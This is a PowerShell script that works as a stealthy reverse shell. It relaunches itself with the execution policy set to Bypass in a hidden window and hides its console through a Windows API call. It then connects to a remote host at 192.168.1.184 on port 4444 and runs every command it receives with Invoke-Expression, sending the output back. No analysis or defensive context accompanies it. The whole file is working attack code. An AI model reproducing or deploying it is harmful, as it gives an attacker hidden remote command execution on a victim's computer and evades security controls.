function Test-IsBypassProcess {
    try { (Get-ExecutionPolicy -Scope Process -ErrorAction Stop) -in 'Bypass','Unrestricted' }
    catch { $false }
}

if (-not (Test-IsBypassProcess)) {
    $scriptPath = $MyInvocation.MyCommand.Path
    if ($scriptPath) {
        $exe = (Get-Command pwsh -ErrorAction SilentlyContinue)?.Source ?? (Get-Command powershell.exe -ErrorAction SilentlyContinue).Source
        if (-not $exe) { Write-Error "f"; exit 1 }
        $escapedArgs = $args | ForEach-Object { if ($_ -match '\s') { '"' + $_.Replace('"','\"') + '"' } else { $_ } } -join ' '
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $exe
        $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" $escapedArgs"
        $psi.UseShellExecute = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError  = $true
        $psi.CreateNoWindow = $true
        $proc = [System.Diagnostics.Process]::Start($psi)
        $proc.BeginOutputReadLine()
        $proc.BeginErrorReadLine()
        $proc.WaitForExit()
        exit $proc.ExitCode
    }

    $scriptText = $MyInvocation.MyCommand.Definition
    if (-not $scriptText) {
        exit 1
    }

    $tempScript = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "remotescript_{0}.ps1" -f ([System.Guid]::NewGuid().ToString()))
    [System.IO.File]::WriteAllText($tempScript, $scriptText, [System.Text.Encoding]::UTF8)

    $argsTemp = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "ps_args_{0}.json" -f [System.Guid]::NewGuid())
    $args | ConvertTo-Json -Compress | Set-Content -Path $argsTemp -Encoding UTF8

    $preamble = @"
`$argsFromFile = $null
if (Test-Path -LiteralPath '$argsTemp') {
    try { `$argsFromFile = (Get-Content -Raw -Encoding UTF8 '$argsTemp' | ConvertFrom-Json) } catch {}
}
if (`$argsFromFile) { `$script:args = @(); `$script:args += `$argsFromFile }
# Ensure temp json is removed when started in child
try { Remove-Item -LiteralPath '$argsTemp' -ErrorAction SilentlyContinue } catch {}
"@

    $finalScript = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "remotescript_final_{0}.ps1" -f ([System.Guid]::NewGuid().ToString()))
    Set-Content -Path $finalScript -Value ($preamble + "`r`n" + $scriptText) -Encoding UTF8

    $exe = (Get-Command pwsh -ErrorAction SilentlyContinue)?.Source ?? (Get-Command powershell.exe -ErrorAction SilentlyContinue).Source
    if (-not $exe) { Write-Error "f"; Remove-Item -LiteralPath $tempScript -ErrorAction SilentlyContinue; exit 1 }

    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $exe
    $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$finalScript`""
    $psi.UseShellExecute = $false
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError  = $true
    $psi.CreateNoWindow = $true
    $psi.WorkingDirectory = (Get-Location).ProviderPath

    $proc = New-Object System.Diagnostics.Process
    $proc.StartInfo = $psi
    $proc.EnableRaisingEvents = $true

    $proc.add_OutputDataReceived( { param($s,$e) if ($e.Data -ne $null) { Write-Output $e.Data } } )
    $proc.add_ErrorDataReceived(  { param($s,$e) if ($e.Data -ne $null) { Write-Error  $e.Data } } )

    if (-not $proc.Start()) {
        Remove-Item -LiteralPath $tempScript,$finalScript,$argsTemp -ErrorAction SilentlyContinue
        exit 1
    }

    $proc.BeginOutputReadLine()
    $proc.BeginErrorReadLine()
    $proc.WaitForExit()

    $exitCode = $proc.ExitCode

    Remove-Item -LiteralPath $tempScript,$finalScript,$argsTemp -ErrorAction SilentlyContinue

    exit $exitCode
}

$hwnd = (Get-Process -Id $PID).MainWindowHandle
if ($hwnd -ne 0) {
    $signature = @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
    Add-Type $signature
    [WinAPI]::ShowWindow($hwnd, 0)  # 0 = SW_HIDE
}

$client = New-Object System.Net.Sockets.TcpClient("192.168.1.184", 4444)
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

while ($true) {
    try {
        $command = $reader.ReadLine()
        if ($command -eq "exit" -or $command -eq $null) { break }

        $output = Invoke-Expression $command 2>&1 | Out-String

        $writer.WriteLine($output)
    } catch {
        $writer.WriteLine("Error: " + $_.Exception.Message)
    }
}

$client.Close()
